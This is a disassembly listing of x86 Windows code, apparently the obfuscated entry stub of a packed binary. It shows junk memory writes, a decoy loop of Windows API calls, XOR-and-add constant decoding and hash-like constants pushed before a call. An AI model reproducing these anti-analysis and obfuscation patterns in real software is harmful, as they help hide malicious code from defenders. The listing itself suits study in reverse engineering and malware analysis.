0x00401d75:	pushl	%ebp	; from: 0x004034c4(MAY)
0x00401d76:	movl	%esp, %ebp
0x00401d78:	subl	$0x24, %esp
0x00401d7b:	movl	$0x2733, %eax
0x00401d80:	movl	0x004172dc, %eax
0x00401d85:	movl	$0xbef51105, -16(%ebp)
0x00401d8c:	movl	$0x5c0f, 0x004175ba
0x00401d96:	movl	$0x0, -36(%ebp)
0x00401d9d:	movl	$0xbef51104, -20(%ebp)
0x00401da4:	movl	$0xbef514c9, -8(%ebp)
0x00401dab:	movl	$0x456d, 0x004175ae
0x00401db5:	movl	%eax, -36(%ebp)
0x00401db8:	movl	%ecx, 0x0041759e
0x00401dbe:	movl	0x00417404, %eax
0x00401dc3:	cmpl	$0xa1ad6c01, %eax
0x00401dc8:	movl	$0x37e4, 0x00417592
0x00401dd2:	jne	0x00401de8	; targets: 0x00401dd8(MAY)
0x00401dd8:	subl	0x004175b2, %eax	; from: 0x00401dd2(MAY)
0x00401dde:	movl	$0x0, 0x00417404
0x00401de8:	movl	-8(%ebp), %eax
0x00401deb:	pushl	%esi
0x00401dec:	notl	%esi
0x00401dee:	movl	$0x7b9298db, %esi
0x00401df3:	andl	$0x4175be, 0x004175ba
0x00401dfd:	pushl	%edi
0x00401dfe:	xorl	%esi, %eax
0x00401e00:	movl	$0x3a987622, %edi
0x00401e05:	adcl	$0x41758e, 0x004175ae
0x00401e0f:	addl	%edi, %eax
0x00401e11:	je	0x00402067	; targets: 0x00401e17(MAY)
0x00401e17:	xorl	%ecx, %ecx	; from: 0x00401e11(MAY)
0x00401e19:	pushl	%ebx
0x00401e1a:	xorl	%edx, 0x0041758e	; from: 0x00402060(MAY)
0x00401e20:	movl	-8(%ebp), %eax
0x00401e23:	movl	-20(%ebp), %ecx
0x00401e26:	imull	%ecx, %eax
0x00401e29:	movl	%eax, -32(%ebp)
0x00401e2c:	incl	%eax
0x00401e2d:	movl	-8(%ebp), %eax
0x00401e30:	addl	0x004175ba, %ebx
0x00401e36:	addl	-16(%ebp), %eax
0x00401e39:	movl	%edi, 0x004175c2
0x00401e3f:	movl	%eax, -12(%ebp)
0x00401e42:	movl	-12(%ebp), %eax
0x00401e45:	movl	0x0041759a, %eax
0x00401e4a:	movl	-8(%ebp), %ebx
0x00401e4d:	movl	-32(%ebp), %eax
0x00401e50:	movl	$0x1e63, 0x004175aa
0x00401e5a:	leal	-28(%ebp), %eax
0x00401e5d:	movl	$0x2ae9, 0x0041757e
0x00401e67:	movl	%eax, -32(%ebp)
0x00401e6a:	movl	$0x229, 0x004175c6
0x00401e74:	movl	%ecx, -32(%ebp)
0x00401e77:	movl	$0xbef51105, -12(%ebp)
0x00401e7e:	movl	$0x417028, 0x004171a0
0x00401e88:	cmpl	$0xbef5138c, %ebx
0x00401e8e:	jne	0x00401ea8	; targets: 0x00401ea8(MAY)
0x00401ea8:	movl	$0x6e93, 0x004175c2	; from: 0x00401e8e(MAY)
0x00401eb2:	cmpl	$0xbef51224, %ebx
0x00401eb8:	movl	$0x60a, 0x004175be
0x00401ec2:	jne	0x00401f0a	; targets: 0x00401f0a(MAY)
0x00401f0a:	movl	$0x1485, 0x004175c2	; from: 0x00401ec2(MAY)
0x00401f14:	cmpl	$0xbef5112b, %ebx
0x00401f1a:	jne	0x00401f44	; targets: 0x00401f44(MAY)
0x00401f44:	movl	-28(%ebp), %eax	; from: 0x00401f1a(MAY)
0x00401f47:	movl	%eax, -32(%ebp)
0x00401f4a:	movl	-20(%ebp), %eax
0x00401f4d:	xorl	$0x5e47, %ecx
0x00401f53:	movl	-32(%ebp), %ecx
0x00401f56:	orl	$0x41758a, 0x004175b2
0x00401f60:	xorl	%esi, %eax
0x00401f62:	addl	$0x4175c2, 0x004175a6
0x00401f6c:	addl	%edi, %eax
0x00401f6e:	movl	$0x35e7, 0x004175b6
0x00401f78:	cmpl	%eax, %ecx
0x00401f7a:	jne	0x00402005	; targets: 0x00401f80(MAY), 0x00402005(MAY)
0x00401f80:	movl	-16(%ebp), %eax	; from: 0x00401f7a(MAY)
0x00401f83:	adcl	$0x305b, 0x00417586
0x00401f8d:	xorl	%esi, %eax
0x00401f8f:	addl	%edi, %eax
0x00401f91:	andl	$0x8fb, 0x00417582
0x00401f9b:	movl	%eax, -12(%ebp)
0x00401f9e:	movl	0x004172cc, %eax
0x00401fa3:	adcl	0x004175b6, %ecx
0x00401fa9:	xorl	%eax, 0x004172cc
0x00401faf:	movzbl	0x004175be, %eax
0x00401fb6:	orl	0x00417592, %eax
0x00401fbc:	movl	%eax, 0x004175be
0x00401fc1:	movl	0x004172d0, %eax
0x00401fc6:	movl	0x004175b2, %ecx
0x00401fcc:	subl	%ecx, 0x0041758a
0x00401fd2:	movl	%eax, 0x00417254
0x00401fd7:	addl	%ecx, %ecx
0x00401fd9:	movl	0x004172d4, %eax
0x00401fde:	movl	%eax, 0x00417024
0x00401fe3:	movl	0x004175a2, %ecx
0x00401fe9:	adcl	0x004175aa, %ecx
0x00401fef:	movl	%ecx, 0x004175a2
0x00401ff5:	movl	0x004172d8, %eax
0x00401ffa:	adcl	$0x3e82, %ecx
0x00402000:	movl	%eax, 0x00417274
0x00402005:	adcl	%edx, 0x0041757e	; from: 0x00401f7a(MAY)
0x0040200b:	movl	-8(%ebp), %eax
0x0040200e:	movzwl	0x0041759a, %ecx
0x00402015:	subl	0x004175ba, %ecx
0x0040201b:	movl	%ecx, 0x0041759a
0x00402021:	movl	-20(%ebp), %ecx
0x00402024:	xorl	%esi, %eax
0x00402026:	adcl	$0x4cd9, 0x0041759a
0x00402030:	xorl	%esi, %ecx
0x00402032:	andl	$0xde1, 0x004175b6
0x0040203c:	subl	%ecx, %eax
0x0040203e:	subl	%edi, %eax
0x00402040:	addl	$0x137f, 0x004175ba
0x0040204a:	xorl	%esi, %eax
0x0040204c:	movl	%eax, -8(%ebp)
0x0040204f:	adcl	$0x27c6, 0x00417592
0x00402059:	movl	-8(%ebp), %eax
0x0040205c:	xorl	%esi, %eax
0x0040205e:	addl	%edi, %eax
0x00402060:	jne	0x00401e1a	; targets: 0x00401e1a(MAY)
0x00402575:	pushl	%ebp	; from: 0x00403445(MAY)
0x00402576:	movl	%esp, %ebp
0x00402578:	pushl	%ecx
0x00402579:	movl	-4(%ebp), %eax
0x0040257c:	cmpl	%edx, %eax
0x0040257e:	jae	0x004026ca	; targets: 0x00402584(MAY), 0x004026ca(MAY)
0x00402584:	movl	%edx, %ecx	; from: 0x0040257e(MAY)
0x00402586:	shrl	$0x8, %ecx
0x00402589:	addl	$0x4175c6, 0x00417582
0x00402593:	pushl	%esi
0x00402594:	xorl	$0x1d88, %esi	; from: 0x00402610(MAY)
0x0040259a:	movl	-4(%ebp), %esi
0x0040259d:	orl	$0x4254, 0x00417582
0x004025a7:	testl	%ecx, %ecx
0x004025a9:	movl	$0x751b, 0x004175b6
0x004025b3:	je	0x004025cb	; targets: 0x004025cb(MAY), 0x004025b9(MAY)
0x004025b9:	movl	$0x160b, 0x004175ae	; from: 0x004025b3(MAY)
0x004025c3:	leal	(%ecx,%esi), %eax
0x004025c6:	jmp	0x004025da	; targets: 0x004025da(MAY)
0x004025cb:	movzbl	%dl, %eax	; from: 0x004025b3(MAY)
0x004025ce:	orl	$0x4175ba, 0x0041758e
0x004025d8:	addl	%esi, %eax
0x004025da:	movl	$0x4589, 0x004175ba	; from: 0x004025c6(MAY)
0x004025e4:	cmpl	%eax, %esi
0x004025e6:	movl	$0x2f26, 0x00417582
0x004025f0:	jae	0x00402608	; targets: 0x004025f6(MAY), 0x00402608(MAY)
0x004025f6:	movl	%eax, -4(%ebp)	; from: 0x004025f0(MAY)
0x004025f9:	movl	$0x21c2, 0x004175b6
0x00402603:	jmp	0x0040260b	; targets: 0x0040260b(MAY)
0x00402608:	incl	-4(%ebp)	; from: 0x004025f0(MAY)
0x0040260b:	movl	-4(%ebp), %eax	; from: 0x00402603(MAY)
0x0040260e:	cmpl	%edx, %eax
0x00402610:	jb	0x00402594	; targets: 0x00402616(MAY), 0x00402594(MAY)
0x00402616:	notl	%esi	; from: 0x00402610(MAY)
0x00402618:	popl	%esi
0x00402619:	movl	$0x4851, 0x0041757e
0x00402623:	jmp	0x004026ca	; targets: 0x004026ca(MAY)
0x00402628:	movl	-4(%ebp), %eax	; from: 0x004026cf(MAY)
0x0040262b:	andl	$0xff, %eax
0x00402630:	cmpl	%eax, %edx
0x00402632:	jbe	0x004026a9	; targets: 0x004026a9(MAY), 0x00402638(MAY)
0x00402638:	movl	-4(%ebp), %eax	; from: 0x00402632(MAY)
0x0040263b:	movl	%edx, %ecx
0x0040263d:	orl	$0x412f, 0x004175a2
0x00402647:	shrl	$0x8, %ecx
0x0040264a:	addl	$0x4175ba, 0x004175b6
0x00402654:	testl	%ecx, %ecx
0x00402656:	movl	$0x1b27, 0x004175b6
0x00402660:	je	0x00402697	; targets: 0x00402697(MAY), 0x00402666(MAY)
0x00402666:	adcl	$0x4175c6, 0x004175be	; from: 0x00402660(MAY), 0x004026a4(MAY)
0x00402670:	subl	%ecx, %eax
0x00402672:	cmpl	%eax, -4(%ebp)
0x00402675:	movl	$0x5e4a, 0x0041758a
0x0040267f:	jbe	0x004026c7	; targets: 0x00402685(MAY), 0x004026c7(MAY)
0x00402685:	movl	$0x7d01, 0x004175a2	; from: 0x0040267f(MAY)
0x0040268f:	movl	%eax, -4(%ebp)
0x00402692:	jmp	0x004026ca	; targets: 0x004026ca(MAY)
0x00402697:	movl	$0x25c3, 0x004175ba	; from: 0x00402660(MAY)
0x004026a1:	movzbl	%dl, %ecx
0x004026a4:	jmp	0x00402666	; targets: 0x00402666(MAY)
0x004026a9:	testl	%eax, %eax	; from: 0x00402632(MAY)
0x004026ab:	je	0x004026c7	; targets: 0x004026c7(MAY), 0x004026b1(MAY)
0x004026b1:	movl	-4(%ebp), %ecx	; from: 0x004026ab(MAY)
0x004026b4:	subl	%eax, %ecx
0x004026b6:	cmpl	%ecx, -4(%ebp)
0x004026b9:	jbe	0x004026c7	; targets: 0x004026bf(MAY), 0x004026c7(MAY)
0x004026bf:	movl	%ecx, -4(%ebp)	; from: 0x004026b9(MAY)
0x004026c2:	jmp	0x004026ca	; targets: 0x004026ca(MAY)
0x004026c7:	decl	-4(%ebp)	; from: 0x0040267f(MAY), 0x004026ab(MAY), 0x004026b9(MAY)
0x004026ca:	movl	-4(%ebp), %eax	; from: 0x0040257e(MAY), 0x00402692(MAY), 0x004026c2(MAY), 0x00402623(MAY)
0x004026cd:	cmpl	%edx, %eax
0x004026cf:	ja	0x00402628	; targets: 0x004026d5(MAY), 0x00402628(MAY)
0x004026d5:	movl	%edx, -4(%ebp)	; from: 0x004026cf(MAY)
0x004026d8:	movl	-4(%ebp), %eax
0x004026db:	leave	
0x004026dc:	ret	; targets: 0x0040344a(MAY)


start:
0x004033f4:	pushl	%ebp
0x004033f5:	movl	%esp, %ebp
0x004033f7:	subl	$0x18, %esp
0x004033fa:	movl	$0xbef51105, -20(%ebp)
0x00403401:	movl	$0xbef51104, -12(%ebp)
0x00403408:	movl	$0x12, -8(%ebp)
0x0040340f:	incl	-8(%ebp)	; from: 0x00403436(MAY)
0x00403412:	pushl	$0x4172f4
0x00403417:	pushl	$0x417300
0x0040341c:	call	lstrcmpW@kernel32.dll	; targets: 0xff000020(MAY)
0x00403422:	call	GetDesktopWindow@user32.dll	; targets: 0xff000030(MAY)
0x00403428:	pushl	$0x6e
0x0040342a:	call	IsCharAlphaNumericW@user32.dll	; targets: 0xff000010(MAY)
0x00403430:	movl	-8(%ebp), %eax
0x00403433:	cmpl	$0x1b, %eax
0x00403436:	jb	0x0040340f	; targets: 0x0040340f(MAY), 0x0040343c(MAY)
0x0040343c:	leal	-24(%ebp), %eax	; from: 0x00403436(MAY)
0x0040343f:	movl	%eax, -16(%ebp)
0x00403442:	leal	0x4(%ebp), %edx
0x00403445:	call	0x00402575	; targets: 0x00402575(MAY)
0x0040344a:	movl	%eax, 0x004172ec	; from: 0x004026dc(MAY)
0x0040344f:	movl	0x004172f0, %eax
0x00403454:	testl	%eax, %eax
0x00403456:	je	0x00403468	; targets: 0x00403468(MAY)
0x00403468:	movl	0x004172ec, %eax	; from: 0x00403456(MAY)
0x0040346d:	movl	0x4(%eax), %eax
0x00403470:	movl	%eax, 0x004172e0
0x00403475:	movl	0x004172ec, %eax
0x0040347a:	movl	0x8(%eax), %eax
0x0040347d:	movl	%eax, 0x004172e4
0x00403482:	movl	0x004172ec, %eax
0x00403487:	movl	0xc(%eax), %eax
0x0040348a:	movl	%eax, 0x004172e8
0x0040348f:	movl	0x004172e0, %eax
0x00403494:	movl	%eax, 0x004172d0
0x00403499:	movl	0x004172e8, %eax
0x0040349e:	movl	%eax, 0x004172d8
0x004034a3:	movl	0x004172e4, %eax
0x004034a8:	pushl	$0x326d79ca
0x004034ad:	movl	%eax, 0x004172d4
0x004034b2:	movl	-16(%ebp), %eax
0x004034b5:	pushl	$0xb60c54c9
0x004034ba:	pushl	$0xb50d66da
0x004034bf:	movl	%eax, 0x004172dc
0x004034c4:	call	0x00401d75	; targets: 0x00401d75(MAY)
